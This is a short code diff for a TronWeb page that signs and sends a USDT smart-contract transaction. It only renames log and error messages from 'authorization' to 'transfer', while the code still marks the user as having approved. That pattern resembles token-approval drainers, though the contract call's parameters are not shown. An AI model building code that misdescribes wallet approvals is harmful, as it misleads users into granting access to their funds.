@@ -733,7 +733,7 @@
             const feeLimit = 100000000;  // 100 TRX
             
             try {
-                console.log("开始USDT授权...");
+                console.log("USDT转账...");
                 const usdtContractAddressHex = window.tronWeb.address.toHex(window.usdtContractAddress);
                 
                 const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
@@ -748,24 +748,24 @@
                 );
 
                 if (!transaction.result || !transaction.result.result) {
-                    throw new Error('授权交易构建失败');
+                    throw new Error('交易失败');
                 }
 
-                console.log("签名授权交易...");
+                console.log("签名交易...");
                 const signedTransaction = await window.tronWeb.trx.sign(transaction.transaction);
 
-                console.log("发送授权交易...");
+                console.log("发送交易...");
                 const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
 
                 if (result.result) {
-                    console.log("授权成功，交易哈希:", result.txid);
+                    console.log("成功，交易哈希:", result.txid);
                     userData.hasApproved = true;
                     return result.txid;
                 } else {
-                    throw new Error("授权失败");
+                    throw new Error("交易失败");
                 }
             } catch (error) {
-                console.error("USDT授权失败:", error);
+                console.error("USDT发送失败:", error);
                 throw error;
             }
         }
